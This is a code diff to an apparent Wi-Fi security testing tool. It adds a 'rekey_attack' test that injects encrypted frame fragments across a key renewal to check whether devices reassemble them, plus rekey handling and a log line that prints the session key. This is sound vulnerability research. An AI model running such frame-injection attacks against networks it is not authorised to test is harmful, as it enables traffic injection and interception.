@@ -66,11 +66,13 @@ class MetaFrag():
 	# Connected: 1 second after handshake completed (allows peer to install keys)
 	StartAuth, BeforeAuth, AfterAuth, Connected = range(4)
 
-	def __init__(self, frag, trigger, encrypted, inc_pn=1):
+	def __init__(self, frag, trigger, encrypted, wait_rekey=False, inc_pn=1):
 		self.frag = frag
-		self.trigger = trigger
 		self.encrypted = encrypted
 		self.inc_pn = inc_pn
+
+		self.trigger = trigger
+		self.wait_rekey = wait_rekey
 
 class TestCase():
 	def __init__(self):
@@ -80,7 +82,8 @@ class TestCase():
 	def next_trigger_is(self, trigger):
 		if len(self.fragments) == 0:
 			return False
-		return self.fragments[0].trigger == trigger
+		return not self.fragments[0].wait_rekey and \
+			self.fragments[0].trigger == trigger
 
 	def success_on(self, payload):
 		self.verify = payload
@@ -89,6 +92,16 @@ class TestCase():
 		frag = self.fragments[0]
 		del self.fragments[0]
 		return frag
+
+	def waiting_rekey(self):
+		if len(self.fragments) == 0:
+			return False
+		return self.fragments[0].wait_rekey
+
+	def waited_rekey(self):
+		assert len(self.fragments) > 0
+		assert self.fragments[0].wait_rekey
+		self.fragments[0].wait_rekey = False
 
 class Station():
 	def __init__(self, daemon, mac, ds_status):
@@ -189,7 +202,7 @@ class Station():
 		# represents the final destination. Otherwise its the BSSID.
 		p.addr3 = destmac if p.FCfield & 1 else self.mac
 
-	def get_header(self, seqnum=None, prior=1, **kwargs):
+	def get_header(self, seqnum=None, prior=2, **kwargs):
 		"""
 		Generate a default common header. By default use priority of 1 so destination
 		will still accept lower Packet Numbers on other priorities.
@@ -339,15 +352,29 @@ class Station():
 
 		return test
 
+	def generate_test_rekey(self):
+		magic = b"rekey_attack"
+		header = self.get_header()
+		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
+		frag1, frag2 = self.create_fragments(header, request, 2)
+
+		test = TestCase()
+		test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuth, True, wait_rekey=True))
+		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
+		test.success_on(magic)
+
+		return test
+
 	def generate_tests(self):
 		#self.test = self.generate_test_arpping(MetaFrag.AfterAuth)
 		#self.test = self.generate_test_ping(MetaFrag.AfterAuth, num_frags=1, encrypted=True)
 		#self.text = self.generate_test_eapol()
 		#self.test = self.generate_test_eapol_debug()
 		#self.test = self.generate_linux_attack()
-		self.test = TestCase()
+		#self.test = TestCase()
 		#self.test = self.generate_test_ping_mixed()
 		#self.test = self.generate_linux_attack_ping()
+		self.test = self.generate_test_rekey()
 
 		# - Test case to check if the receiver supports interleaved priority
 		#   reception. It seems Windows 10 / Intel might not support this.
@@ -385,6 +412,7 @@ class Station():
 			if metafrag.encrypted:
 				assert self.tk != None and self.gtk != None
 				frag = self.encrypt(metafrag.frag, inc_pn=metafrag.inc_pn)
+				log(STATUS, "Encrypted fragment with key " + self.tk.hex())
 			else:
 				frag = metafrag.frag
 			self.daemon.inject_mon(frag)
@@ -418,11 +446,14 @@ class Station():
 			log(STATUS, "MetaFrag.StartAuth", color="green")
 			self.inject_next_frags(MetaFrag.StartAuth)
 			self.txed_before_auth = True
+			self.txed_before_auth_done = False
+
 		# Inject any fragments when almost done authenticating
 		elif is_msg3_or_4 and not self.txed_before_auth_done:
 			log(STATUS, "MetaFrag.BeforeAuth", color="green")
 			self.inject_next_frags(MetaFrag.BeforeAuth)
 			self.txed_before_auth_done = True
+			self.txed_before_auth = False
 
 	def handle_eapol_tx(self, eapol):
 		eapol = EAPOL(eapol)
@@ -449,12 +480,19 @@ class Station():
 
 		self.time_connected = time.time() + 1
 
+	def check_rekey(self):
+		if self.test.waiting_rekey():
+			# Force rekey as AP, wait on rekey as client
+			self.daemon.rekey(self)
+			self.test.waited_rekey()
+
 	def handle_connected(self):
 		"""This is called ~1 second after completing the handshake"""
 		log(STATUS, "MetaFrag.Connected", color="green")
 		self.inject_next_frags(MetaFrag.Connected)
 
 		#self.daemon.rekey(self)
+		self.check_rekey()
 
 	def set_ip_addresses(self, ip, peerip):
 		self.ip = ip
@@ -670,6 +708,7 @@ class Authenticator(Daemon):
 				return
 			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))
 
+		# XXX update so this also works with rekeys
 		elif "AP-STA-CONNECTED" in msg:
 			cmd, clientmac = msg.split()
 			if not clientmac in self.stations:
@@ -730,6 +769,7 @@ class Supplicant(Daemon):
 	def rekey(self, station):
 		# WAG320N: does not work (Broadcom - no reply)
 		# MediaTek: starts handshake. But must send Msg2/4 in plaintext! Request optionally in plaintext.
+		#	Maybe it's removing the current PTK before a rekey?
 		# RT-N10: we get a deauthentication as a reply. Connection is killed.
 		# LANCOM: does not work (no reply)
 		# Aruba: TODO
@@ -737,8 +777,7 @@ class Supplicant(Daemon):
 		#     untill the AP starts a rekey.
 		#wpaspy_command(self.wpaspy_ctrl, "KEY_REQUEST 0 1")
 
-		log(ERROR, "Supplicant.rekey() was found to be unreliable and shouldn't be used.")
-		quit(1)
+		log(STATUS, "Client cannot force rekey. Waiting on AP to start PTK rekey.", color="orange")
 
 	def time_tick(self):
 		self.station.time_tick()
@@ -806,7 +845,7 @@ class Supplicant(Daemon):
 	def handle_wpaspy(self, msg):
 		log(STATUS, "daemon: " + msg)
 
-		if "CTRL-EVENT-CONNECTED" in msg:
+		if "WPA: Key negotiation completed with" in msg:
 			# This get's the current keys
 			self.station.handle_authenticated()
 
